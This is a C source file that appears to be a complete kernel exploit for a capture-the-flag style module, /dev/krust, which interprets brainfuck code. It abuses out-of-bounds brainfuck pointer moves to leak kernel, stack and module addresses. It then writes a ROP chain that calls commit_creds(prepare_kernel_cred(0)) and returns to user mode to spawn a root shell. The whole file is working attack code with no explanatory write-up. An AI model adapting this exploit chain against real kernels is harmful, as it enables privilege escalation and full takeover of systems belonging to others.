#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>

#define PAUSE() do { printf("PAUSE\n"); scanf("%*c"); } while(0)

// Copy 0x500 bytes from buf to input_buffer in kernel
#define CMD_SET_INPUT 0x45001234

// Copy 0x500 bytes from buf to content_buffer in kernel and run it as brainfuck code
#define CMD_RUN_BF 0x4500BEEF

// Copy n bytes from output_buffer in kernel to buf
#define CMD_READ 0x8500BEEF

#define TO_UINT64(CHARPTR) (*((uint64 *)CHARPTR))

typedef unsigned long long int uint64;

void dump(char *buffer, int size)
{
    for (int i = 0; i < size; i += 0x10) {
        printf("%#llx %#llx\n", TO_UINT64(&buffer[i]), TO_UINT64(&buffer[i + 8]));
    }
}

unsigned long user_cs, user_ss, user_eflags, user_sp;
void save_stats() 
{
    asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %3\n"
            "pushfq\n"
            "popq %2\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp)
            :
            : "memory"
    );
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    int ret, fd, idx;
    char *ptr;
    uint64 *ropchain_ptr;
    char buf[0x500] = { 0 };
    char output[0x500] = { 0 };
    
    fd = open("/dev/krust", O_RDWR);
    if (fd == -1) {
        printf("open failed");
        exit(1);
    }
    
    PAUSE();
    ret = ioctl(fd, CMD_SET_INPUT, buf);

    // leak 0x10 bytes in $rbp - 0x8a0 + 0x820
    memset(buf, '>', 0x400);
    ret = ioctl(fd, CMD_RUN_BF, buf);
    ret = ioctl(fd, CMD_RUN_BF, buf);

    memset(buf, 0, 0x500);
    memset(buf, '>', 0x20);
    ptr = &buf[0x20];
    for (int i = 0; i < 0x10; ++i) {
        ptr[i*2] = '.';
        ptr[i*2+1] = '>';
    }

    // leak 0x10 bytes in $rbp
    ptr = &buf[0x40];
    memset(ptr, '>', 0xa0 - 0x30);
    ptr = &buf[0x40 + 0xa0 - 0x30];
    for (int i = 0; i < 0x10; ++i) {
        ptr[i*2] = '.';
        ptr[i*2+1] = '>';
    }
    
    // PAUSE();
    ret = ioctl(fd, CMD_RUN_BF, buf);

    // PAUSE();
    ret = ioctl(fd, CMD_READ, output);

    printf("output:\n");
    dump(output, 0x20);

    uint64 linux_base = TO_UINT64(&output[0]) - 0x133570;
    uint64 stack = TO_UINT64(&output[0x10]);
    uint64 module_base = TO_UINT64(&output[0x18]) - 0x44f;

    printf("linux base  : %#llx\n", linux_base);
    printf("stack       : %#llx\n", stack);
    printf("module base : %#llx\n", module_base);

    // run commit_creds(prepare_kernel_cred(0))
    uint64 prepare_kernel_cred = linux_base + 0x7e940;
    uint64 commit_creds = linux_base + 0x7e660;
    uint64 swapgs_restore_regs_and_return_to_usermode = linux_base + 0x600df0 + 0x16;
    uint64 pop_rdi = linux_base + 0x57620;
    uint64 pop_rcx = linux_base + 0x1a913;
    uint64 just_ret = linux_base + 0x1a914;
    uint64 mov_rdi_rax_call_rcx_pop_rbp = linux_base + 0x185ab;

    save_stats();

    // Set rop chain
    memset(buf, 0, 0x500);
    idx = 0;
    ropchain_ptr = (uint64 *)buf;
    ropchain_ptr[idx++] = pop_rdi;
    ropchain_ptr[idx++] = 0;
    ropchain_ptr[idx++] = prepare_kernel_cred;
    ropchain_ptr[idx++] = pop_rcx;
    ropchain_ptr[idx++] = just_ret;
    ropchain_ptr[idx++] = mov_rdi_rax_call_rcx_pop_rbp;
    ropchain_ptr[idx++] = stack;
    ropchain_ptr[idx++] = commit_creds;
    ropchain_ptr[idx++] = swapgs_restore_regs_and_return_to_usermode;
    ropchain_ptr[idx++] = 0;
    ropchain_ptr[idx++] = 0;
    ropchain_ptr[idx++] = get_shell;
    ropchain_ptr[idx++] = user_cs;
    ropchain_ptr[idx++] = user_eflags;
    ropchain_ptr[idx++] = user_sp;
    ropchain_ptr[idx++] = user_ss;

    printf("swapgs_restore_regs_and_return_to_usermode: %#llx\n", swapgs_restore_regs_and_return_to_usermode);
    printf("get_shell: %#llx\n", get_shell);

    // PAUSE();
    ret = ioctl(fd, CMD_SET_INPUT, buf);

    memset(buf, 0, 0x500);
    memset(buf, '<', 8);
    ptr = &buf[8];
    for (int i = 0; i < idx * 8; ++i) {
        ptr[i*2] = ',';
        ptr[i*2+1] = '>';
    }

    // PAUSE();
    ret = ioctl(fd, CMD_RUN_BF, buf);
    
    return 0;
}